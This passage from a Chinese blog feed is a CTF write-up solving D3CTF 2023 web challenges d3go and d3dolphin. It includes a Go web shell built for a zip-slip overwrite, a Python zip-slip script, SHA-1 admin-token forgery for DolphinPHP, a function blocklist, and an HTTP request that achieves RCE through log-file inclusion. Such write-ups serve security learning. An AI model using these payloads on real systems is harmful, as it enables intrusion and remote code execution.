class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们就好说了，我们可以覆盖config.yaml实现自更新，以下是chatgpt问答</p><p><a href="https://boogipop.com/2023/05/06/D3CTF%20x%20AntCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/#d3go">参考boogipop师傅的</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">overseer.Run(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, c.PostForm(<span class="string">&quot;cmd&quot;</span>)).CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err := r.RunListener(state.Listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这就是恶意的go文件，把他编译为二进制文件后，还需要准备一个yaml文件</p><p>下面这个是原本的config.yaml文件</p><p><img src="../images/image-20230507164810114.png" alt="image-20230507164810114"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  noAdminLogin: <span class="literal">true</span></span><br><span class="line">database:</span><br><span class="line">  user: root</span><br><span class="line">  password: root</span><br><span class="line">  host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  port: <span class="number">3306</span></span><br><span class="line">update:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br><span class="line">  url: http:<span class="comment">//127.0.0.1:8080/unzipped/shell</span></span><br><span class="line">  interval: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>之后利用zipslip去覆盖文件，因为题目并没有对unzip做处理，所以可以进行任意文件覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##生成的zip文件</span></span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;exp.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;E:\\CTFLearning\\d3ctf\\d3go\\trueexp\\shell\\config.yaml&quot;</span>, <span class="string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.write(<span class="string">&quot;./shell&quot;</span>, <span class="string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>然后将生成的文件上传到服务器上就可以成功rce了</p><h2 id="d3dolphin"><a href="#d3dolphin" class="headerlink" title="d3dolphin"></a>d3dolphin</h2><p><strong>提示：</strong></p><p><strong>没有必要蛮力。管理员自从他写日志后就再也没有出现过。</strong></p><p><strong>管理员通过简单地按照 <a href="https://github.com/ssteveez/dolphin/blob/main/README.md">https://github.com/ssteveez/dolphin/blob/main/README.md</a> 所说的内容来修补错误</strong></p><p>题目</p><p><img src="../images/image-20230505201032755.png" alt="image-20230505201032755"></p><p><img src="../images/image-20230505201049807.png" alt="image-20230505201049807"></p><p>给了个CVE   然后告诉你这里使用了补丁来修复这个CVE</p><p>signin_token 可以很容易地通过提供⽤⼾名、id 和⽤⼾ [last_login_time] 来暴⼒破解</p><p><strong>因为admin的用户密码不知道，于是就去下载源码来进行查看</strong></p><p><img src="../images/image-20230505211453158.png" alt="image-20230505211453158"></p><p>发现代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;is_signin&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断是否登录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_signin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$user</span>)) &#123;</span><br><span class="line">            <span class="comment">// 判断是否记住登录</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?uid&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?signin_token&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$UserModel</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$UserModel</span>::<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;uid&#x27;</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="variable">$signin_token</span> = <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;last_login_time&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;signin_token&#x27;</span>) == <span class="variable">$signin_token</span>) &#123;</span><br><span class="line">                        <span class="comment">// 自动登录</span></span><br><span class="line">                        <span class="variable">$UserModel</span>-&gt;<span class="title function_ invoke__">autoLogin</span>(<span class="variable">$user</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth_sign&#x27;</span>) == <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>) ? <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据log.txt，admin的last_login_time是2011-04-05 14:19:19，这样我们就可以⽣成⼀个signing_token：</p><p>这里需要的是时间戳  所以<strong>2011-04-05 14:19:19</strong>的时间戳为1301984359</p><p><img src="../images/image-20230505211707879.png" alt="image-20230505211707879"></p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;data_auth_sign&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据签名认证</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data 被认证的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">data_auth_sign</span>(<span class="params"><span class="variable">$data</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据类型检测</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$data</span> = (<span class="keyword">array</span>)<span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 排序</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// url编码并生成query字符串</span></span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// 生成签名</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以进行签名的伪造了</p><p><img src="../images/image-20230505214149350.png" alt="image-20230505214149350"></p><p>这里为了避免id和时间戳的混淆，于是这里就可以使用分+号来进行分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;0=admin1&quot;</span> . <span class="string">&quot;1301984359&quot;</span>;  <span class="comment">// 要计算 SHA-1 哈希的字符串</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$s</span>);  <span class="comment">// 计算 SHA-1 哈希值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$h</span>;  <span class="comment">// 输出：ab5f486a24426d9158c99507da45ae3bac476dd6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成cookie后，就可以进行伪造登录了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505214607572.png" alt="image-20230505214607572"></p><p>因为这里存在通配符，于是名字就可以这样取</p><p><img src="../images/image-20230505214838155.png" alt="image-20230505214838155"></p><p>添加cookie后就可以成功进行登录了</p><p>这里的版本是v1.5.1，于是可以去查看上一个版本的漏洞，看这个版本修复了啥，然后在通过看官方的修复有没有漏洞，我们可不可以进行绕过</p><p>根据<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 海豚PHP框架 [ DolphinPHP ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 版权所有 2016~2019 广东卓锐软件有限公司 [ http://www.zrthink.com ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 官方网站: http://dolphinphp.com</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 拒绝ie访问</span></span><br><span class="line">    <span class="string">&#x27;deny_ie&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 模块管理中，不读取模块信息的目录</span></span><br><span class="line">    <span class="string">&#x27;except_module&#x27;</span> =&gt; [<span class="string">&#x27;common&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;extra&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;install&#x27;</span>],</span><br><span class="line">    <span class="comment">// 禁用函数</span></span><br><span class="line">    <span class="string">&#x27;disable_functions&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chroot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chgrp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_alter&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_restore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;openlog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;syslog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;readlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;symlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popepassthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505215639032.png" alt="image-20230505215639032"></p><p>直接去查看官方发布的补丁就行了</p><p>CVE-2023-0935 是使⽤ shell_exec 绕过 CVE-2021-46097 2. 根据<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。 然后使⽤登录管理⻔⼾ 在这个挑战中，shell_exec 被添加到 system.php 中的 disable_functions，以及 php.ini 下⾯的其他函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini</span><br><span class="line">_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_waitp</span><br><span class="line">id,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_w</span><br><span class="line">exitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_er</span><br><span class="line">ror,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_</span><br><span class="line">getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv</span><br></pre></td></tr></table></figure><p>我们的⽬标是基于 CVE-2021-46097 再次绕过它</p><p>这里的话就是个小0day了，得自己挖利用链了  <strong>(第一次遇到得自己挖0day的题)</strong></p><p>我们可以通过更改昵称来完全控制 <strong>$details</strong>（此处为 get_nickname(UID)）。action_name 为 “user_edit”。</p><p><img src="../images/image-20230506222438638.png" alt="image-20230506222438638"></p><p>修改名称</p><p><img src="../images/image-20230506222544278.png" alt="image-20230506222544278"></p><p>Thinkphp 框架在 Loader.php 中定义了⼀个名为 include_file 的函数</p><p><img src="../images/image-20230506222655072.png" alt="image-20230506222655072"></p><p>所以我们可以将think__include_file作为第⼀个参数传递给call_user_func。</p><p>奇怪的是，thinkphp在./runtime下记录了SQL⽇志，⽽我们刚才做的是修改admin的昵称。昵称先被拼接成⼀条SQL命令，然后记 录到⽇志中。</p><p><img src="../images/image-20230506225333824.png" alt="image-20230506225333824"></p><p><img src="../images/image-20230506225655306.png" alt="image-20230506225655306"></p><p>2.编辑admin的昵称，使⽇志⽂件包含我们的webshell。</p><p>3.擦除缓存。这⼀步是必须的，否则昵称不会更新。</p><p><img src="../images/image-20230506230530708.png" alt="image-20230506230530708"></p><p>将昵称编辑为../runtime/2023/05/01.log。我们可以通过发送这样的请求来执⾏PHP代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/admin/index/profile.html HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 114</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Referer: http://localhost/admin.php/admin/index/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6;</span><br><span class="line">PHPSESSID=88h9tlthje0nfe2sod7c8v6e39</span><br><span class="line">Connection: close</span><br><span class="line">__token__=d8c89447445b0095fb569725f91f0505&amp;nickname=../runtime/log/202304/29.log</span><br><span class="line">&amp;email=&amp;password=&amp;mobile=&amp;avatar=0&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>最后改命令来拿flag就行了</p><p><strong>难坏了</strong>   <strong>居然得自己分析源码来拿链子</strong>。。。。。。。</p><p>这里的话java还有好多东西没看  所以java题就先不进行复现了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的复现都是去网上搜索前几名发的wp来复现的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;amp;mid=2247486967&amp;amp;idx=1&amp;amp;sn=ad55ddd11c6</summary>
      
    
    
    
    
    <category term="AntCTF x D³CTF" scheme="https://ke1nys.github.io/tags/AntCTF-x-D%C2%B3CTF/"/>
    
  </entry>
  
</feed>
